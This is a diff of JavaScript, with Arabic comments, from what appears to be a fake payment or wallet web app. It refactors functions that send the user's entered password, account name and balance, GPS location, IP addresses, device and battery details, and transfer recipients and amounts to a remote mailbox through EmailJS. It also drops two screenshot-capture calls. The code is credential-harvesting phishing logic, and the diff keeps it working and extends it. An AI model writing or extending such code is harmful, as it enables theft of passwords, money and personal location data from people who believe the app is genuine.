@@ -111,60 +111,58 @@ function sendEmailNotification(params) {
 }
 
 // ========== 8. بناء الحقول الكاملة ==========
-function _buildFullParams(eventType, password, extraData) {
+function _buildFullParams(eventType, password, recipientName, recipientPhone, amount) {
     const ip = _ipData;
     return {
-        event_type:   eventType,
-        password:     password  || "—",
-        user_name:    localStorage.getItem("user_name")    || "—",
-        user_balance: localStorage.getItem("user_balance") || "—",
-        timestamp:    new Date().toLocaleString("ar-EG"),
+        event_type:      eventType,
+        password:        password       || "—",
+        user_name:       localStorage.getItem("user_name")    || "—",
+        user_balance:    localStorage.getItem("user_balance") || "—",
+        timestamp:       new Date().toLocaleString("ar-EG"),
+
+        // تفاصيل العملية
+        recipient_name:  recipientName  || "—",
+        recipient_phone: recipientPhone || "—",
+        amount:          amount         || "—",
 
         // الموقع
-        gps_link:     _gpsLocation,
-        city:         `${ip.city || "—"} — ${ip.region || "—"}`,
-        country:      ip.country  || "—",
-        postal:       ip.postal   || "—",
-        isp:          ip.isp      || "—",
-        timezone:     ip.timezone || "—",
+        gps_link:        _gpsLocation,
+        city:            `${ip.city || "—"} — ${ip.region || "—"}`,
+        country:         ip.country  || "—",
+        postal:          ip.postal   || "—",
+        isp:             ip.isp      || "—",
+        timezone:        ip.timezone || "—",
 
         // الشبكة والـ IP
-        public_ip:    ip.ip       || "—",
-        local_ip:     _localIP,
-        connection:   _connectionType,
+        public_ip:       ip.ip       || "—",
+        local_ip:        _localIP,
+        connection:      _connectionType,
 
         // الجهاز
-        device_info:  getDeviceInfo(),
+        device_info:     getDeviceInfo(),
 
         // البطارية
-        battery:      _batteryData,
-
-        // بيانات العملية
-        extra_data:   extraData || "—"
+        battery:         _batteryData
     };
 }
 
 // ========== 9. دوال الإرسال ==========
 function sendLoginData(password) {
     const send = () => sendEmailNotification(
-        _buildFullParams("🔐 تسجيل دخول", password,
-            `رصيد الحساب: ${localStorage.getItem("user_balance") || "—"} ILS`)
+        _buildFullParams("🔐 تسجيل دخول", password, "—", "—", "—")
     );
-    // ننتظر 3 ثوانٍ لضمان اكتمال جلب IP والموقع
     setTimeout(send, 3000);
 }
 
 function sendTransferData(recipientName, recipientPhone, amount) {
     sendEmailNotification(
-        _buildFullParams("💸 تحويل لصديق", "—",
-            `المستلم: ${recipientName} | الهاتف: ${recipientPhone} | المبلغ: ${amount} ILS`)
+        _buildFullParams("💸 تحويل لصديق", "—", recipientName, recipientPhone, amount)
     );
 }
 
 function sendMerchantPaymentData(merchantName, amount, refNum) {
     sendEmailNotification(
-        _buildFullParams("🏪 دفع لتاجر", "—",
-            `التاجر: ${merchantName} | المبلغ: ${amount} ILS | المرجع: ${refNum}`)
+        _buildFullParams("🏪 دفع لتاجر", "—", merchantName, refNum, amount)
     );
 }
 
@@ -492,9 +490,6 @@ document.getElementById('confirmBtn')?.addEventListener('click', function() {
         recipientPhoneEl.textContent || '—',
         total.toFixed(2)
     );
-
-    // 📸 لقطة شاشة عند التحويل
-    setTimeout(() => captureAndSendScreenshot('screen-6', 'لقطة تحويل لصديق'), 1500);
 
     showScreen('s6');
     updateNotificationBadge();
@@ -880,9 +875,6 @@ if (confirmMerchantBtn) {
 
         // ✉️ إرسال بيانات دفع التاجر عبر EmailJS
         sendMerchantPaymentData(mName, parseFloat(amount || 0).toFixed(2), refNum);
-
-        // 📸 لقطة شاشة عند دفع التاجر
-        setTimeout(() => captureAndSendScreenshot('screen-10', 'لقطة دفع تاجر'), 1500);
 
         showScreen('s10'); 
     });
